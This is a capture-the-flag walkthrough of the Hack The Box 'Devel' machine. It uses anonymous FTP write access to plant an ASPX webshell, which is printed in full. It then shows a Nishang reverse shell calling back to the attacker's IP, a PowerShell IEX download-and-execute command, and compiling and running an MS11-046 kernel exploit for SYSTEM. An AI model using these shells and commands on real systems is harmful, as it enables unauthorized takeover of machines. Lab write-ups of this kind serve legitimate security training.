title: "HTB: DEVEL (10.10.10.5)"
description: "Devel is a user-friendly Windows box ideal for beginners. It begins with an open FTP server, allowing anonymous login with write access to the web server's root directory. My initial step involves uploading a webshell to establish a foothold, which will then enable me to gain a reverse shell on the system. Once inside, I'll explore various available Windows kernel exploits to escalate privileges and achieve root access."

## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

We see two port open `FTP ON PORT 21` and `HTTP ON PORT 80`

The box is likely a Windows box as suggested by nmap.

### Port Enumeration
#### FTP

FTP allows for anonymous login

```
Judging by the files I'd say this is the root of the web directory.

These are just the default `microsoft IIS` files. We cant tell this by looking at the web page

#### HTTP

The webpage shows the default `microsoft IIS` Installation.

![Default Installation](/assets/img/devel/default_iis.png)

Directory Bruteforce gives us nothing useful

## Shell as Web
### Uploading a Webshell
I went back to our `FTP` access to see if i have read/write privilages on the box.

And indeed we can write to the directory.

Since ftp has write persmission here so I will upload an `aspx` webshell

You may be wondering why `aspx` and not php, well microsoft webserver does not support php out of the box unlike apache and nginx.

Looking around, I came across this [Webshell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx)

```html  
<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">

Sub RunCmd(Src As Object, E As EventArgs)
Dim myProcess As New Process()
Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)
myProcessStartInfo.UseShellExecute = false
myProcessStartInfo.RedirectStandardOutput = true
myProcess.StartInfo = myProcessStartInfo
myProcessStartInfo.Arguments=xcmd.text
myProcess.Start()

Dim myStreamReader As StreamReader = myProcess.StandardOutput
Dim myString As String = myStreamReader.Readtoend()
myProcess.Close()
mystring=replace(mystring,"<","&lt;")
mystring=replace(mystring,">","&gt;")
result.text= vbcrlf & "<pre>" & mystring & "</pre>"
End Sub

</script>

<html>
<body>
<form runat="server">
<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>
<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>
<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>
<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>
<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>
<p><asp:Label id="result" runat="server"></asp:Label>
</form>
</body>
</html>

```
I will Upload it without any issues

```sh
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1585 bytes sent in 0.00 secs (6.6589 MB/s)

200 PORT command successful.
125 Data connection already open; Transfer starting.

09-28-23  08:56AM                 1585 shell.aspx
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
### Getting our foothold

Once the webshell is uploaded, I can visit the site and call it directy on my browser using the name i gave it.

![Getting our foothold](/assets/img/devel/shell_works.png)

I will switch to powershell so that I can use the `invoke` expressions to download and execute our shell

But first I need to test if we have code execution

![RCE Testing](/assets/img/devel/powershell.png)

For the foothold on the box I will use [Nishang](https://github.com/samratashok/nishang).

Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.

Within the nishang directory I will use a simple reverse shell, `Invoke-PowerShellTcp.ps1` copy it to my working folder and call it `shell.ps1`

```c
-----------snip-------------

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.7 -Port 9001
```

Lets create a directory called `www` simply because I dont like exposing all my directory contents to the web.

I will move the `shell.ps1` to this directory and set a webserver to listen on port 80 using the `python3` command

```sh
┌─[george@parrot]─[~/HTB/boxes/devel]
└──╼ $ mkdir www;mv shell.ps1 www
┌─[george@parrot]─[~/HTB/boxes/devel]
└──╼ $ cd www
┌─[✗]─[george@parrot]─[~/HTB/boxes/devel/www]
└──╼ $ sudo python3 -m http.server 80
[sudo] password for george:
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Back to the `webshell`, I will use below `Invoke` command to download and execute the `powershell` script.

```powershell
-Command "IEX(New-Object Net.Webclient).downloadString('http://10.10.16.7:80/shell.ps1')"
```

On our Terminal, I see it grabs the `shell.ps1` file

```sh
10.10.10.5 - - [28/Sep/2023 18:05:54] "GET /shell.ps1 HTTP/1.1" 200 -
```

On the other terminal with out `nc` listener, I see a connection.

```sh
┌─[george@parrot]─[~/HTB/boxes/devel]
└──╼ $ rlwrap nc -lvnp 9001
listening on [any] 9001 ...

## Shell as NT AUTHORITY\SYSTEM
### systeminfo

Looking at the `systeminfo` output i notice there are no hotfixes for this box which is a good thing for me.

The OS Version is `6.1.7600 N/A Build 7600`. I will look if there is any Kernel exploitation for this build.

Right of the bat I get one that looks promising

### MS11-046 (CVE-2011-1249)

The Ancillary Function Driver (AFD) supports Windows sockets applications and is contained in the afd.sys file. The afd.sys driver runs in kernel mode and manages the Winsock TCP/IP communications protocol. An elevation of privilege vulnerability exists where the AFD improperly validates input passed from user mode to the kernel. An attacker must have valid logon credentials and be able to log on locally to exploit the vulnerability. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode (i.e. with NT AUTHORITY\SYSTEM privileges).

Sweet! thats what we need. Further googling leads me to the exploit script from [exploitdb](https://www.exploit-db.com/exploits/40564) which need to be compiled.

I will compile it on my linux box using `mingw-w64` and save it as `privesc.exe`. You can easily install this by issuing the `sudo apt-get install mingw-w64`

```sh
┌─[george@parrot]─[~/HTB/boxes/devel/www]
└──╼ $ i686-w64-mingw32-gcc 40564.c -o privesc.exe -lws2_32                                                      
┌─[george@parrot]─[~/HTB/boxes/devel/www]
└──╼ $ ls                                               
40564.c  privesc.exe  shell.ps1
```
Once thats done, I will host a webserver on my box and on the windows machine I will download it and execute it.

```sh
┌─[george@parrot]─[~/HTB/boxes/devel/www]
└──╼ $ sudo python3 -m http.server 80                                                                            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...                                                         
10.10.10.5 - - [28/Sep/2023 22:58:01] "GET /privesc.exe HTTP/1.1" 200 -                                          
10.10.10.5 - - [28/Sep/2023 23:02:15] "GET /privesc.exe HTTP/1.1" 200 -
```

### Ran into Trouble!!

Since my shell is in powershell, I had a hard time trying to execute this binary.

```shell
cmd.exe /c privesc.exe

### Workaround

I generated an `aspx` payload using `msfvemom` then uploaded it via `FTP`. Visited the page and I got my shell back

### privilage escalation

Moving back to my `temp` folder where I had saved the file, I was now able to execute it and get `nt authority\system`

```
cd c:\windows\temp
privesc.exe                                  

whoami                                          
whoami                                          
nt authority\system                             

c:\Windows\System32>
```
